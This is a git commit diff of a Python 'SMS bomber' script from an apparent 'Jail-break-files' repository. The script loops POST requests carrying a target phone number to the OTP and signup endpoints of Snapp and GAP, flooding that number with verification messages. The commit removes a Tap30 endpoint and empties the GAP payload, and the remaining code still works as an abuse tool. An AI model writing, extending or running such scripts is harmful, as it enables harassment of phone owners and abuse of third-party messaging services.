dd8e87bf3207bd157fe4487b95fbec086986c973
CharonDefalt <103410775+CharonDefalt@users.noreply.github.com>
2023-04-11 11:37:14 +0330

    Update sms-bomber-tap30-v1.py

--- Jail-break-files/web application/sms-bomber-tap30-v1.py
+++ Jail-break-files/web application/sms-bomber-tap30-v1.py
@@ -9,12 +9,11 @@ number_of_sms_to_send = 10
 # API URLs
 snapp_api_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
 gap_api_url = 'https://core.gap.im/v1/user/add.json?mobile=%2B{}'
-tap30_api_url= 'https://api.tapsi.cab/api/v2.2/user'
+
 
 # Payloads for the APIs
 snapp_payload = {'cellphone': target_phone_number}
-gap_payload = {'cellphone': target_phone_number}
-tap30_payload = {'cellphone': target_phone_number}
+gap_payload = {}
 
 # Headers for the APIs
 headers = {'Content-Type': 'application/json'}
@@ -27,9 +26,4 @@ for i in range(number_of_sms_to_send):
 # Send SMS using GAP API
 for i in range(number_of_sms_to_send):
     response = requests.post(gap_api_url.format(target_phone_number), headers=headers, json=gap_payload)
-    print(f'GAP SMS {i+1} sent with response code {response.status_code}')
-
-# Send SMS using Tap30 API
-for i in range(number_of_sms_to_send):
-    response = requests.post(tap30_api_url.format(target_phone_number), headers=headers, json=tap30_payload)
     print(f'GAP SMS {i+1} sent with response code {response.status_code}')
